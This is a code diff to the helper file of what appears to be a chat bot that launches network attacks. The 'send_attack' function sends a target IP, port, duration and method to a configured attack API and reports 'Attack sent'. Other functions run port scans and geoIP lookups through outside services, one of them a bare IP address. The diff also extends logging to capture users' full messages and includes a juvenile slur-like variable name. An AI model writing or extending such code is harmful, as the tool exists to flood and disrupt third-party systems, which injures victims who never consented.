@@ -12,7 +12,7 @@ const Extra = require("./functions.js");
 *@type: (Promise[<strig>])
 */
 exports.geoIP = async function(ip) {
-    let response = await (await fetch("https://scrapy.tech/geo.php?ip=" + ip)).text();
+    let response = await (await fetch("http://194.87.68.129/geo.php?ip=" + ip)).text();
     return response;
 }
 
@@ -22,16 +22,17 @@ exports.geoIP = async function(ip) {
 */
 exports.pScan = async function(ip) {
     let response = await (await fetch("https://scrapy.tech/pscan.php?ip=" + ip)).text();
-    return response;
+    return "```" + response + "```";
 }
 
 /*
 *@type: (void)
 */
 exports.log_console = function(status) {
-    let output = "[CMD/MSG]: " + status + "\r\n" + "[User]: " + C.CurrentUser.Name + " | [UserID]: " + C.CurrentUser.UserID + "\r\n";
+    let output = "[CMD/MSG]: " + status + " | [Timestamp]: " + Extra.currentTime() + "\r\n" + "[User]: " + C.CurrentUser.Name + " | [UserID]: " + C.CurrentUser.UserID + "\r\n";
     output += "[Server]: " + C.CurrentRoom.Server + " | [ServerID]: " + C.CurrentRoom.ServerID + "\r\n";
-    output += "[Channel]: " + C.CurrentRoom.Channel + " | [ChannelID]: " + C.CurrentRoom.ChannelID + "\r\n\r\n";
+    output += "[Channel]: " + C.CurrentRoom.Channel + " | [ChannelID]: " + C.CurrentRoom.ChannelID + "\r\n";
+    output += "[CMD]: " + C.CurrentCmd.Cmd + " | [FullMSG]: " + C.CurrentCmd.fullcmd + "\r\n\r\n";
     console.log(output);
     Extra.log_to_file(output);
 }
@@ -40,7 +41,7 @@ exports.log_console = function(status) {
 *@params: IP Adress, Port, Time, Method
 *@type: (Promise[<string>])
 */
-exports.send_attack = function(ip, p, t, m) { 
+exports.send_attack = async function(ip, p, t, m) { 
     let response = await (await fetch(Config.API_1 + ip + "&port=" + p + "&time=" + t + "&type=" + m)).text();
     return "Attack sent";
 }
@@ -50,7 +51,8 @@ exports.send_attack = function(ip, p, t, m) {
 */
 exports.currentTime = function() {
     let current = new Date();
-    return current.getMonth()+1 + "/" + current.getDate() + "/" + current.getFullYear();
+    let gay = current.getMonth()+1 + "/" + current.getDate() + "/" + current.getFullYear();
+    return gay;
 }
 
 /*
@@ -67,4 +69,12 @@ exports.log_to_file = function(output) {
 */
 exports.log_attack = function(u, ip, p, t, m) {
 
+}
+
+/*
+*@params: time
+*@type: (void)
+*/
+exports.sleep = function(time) {
+    return new Promise((resolve) => setTimeout(resolve, time));
 }
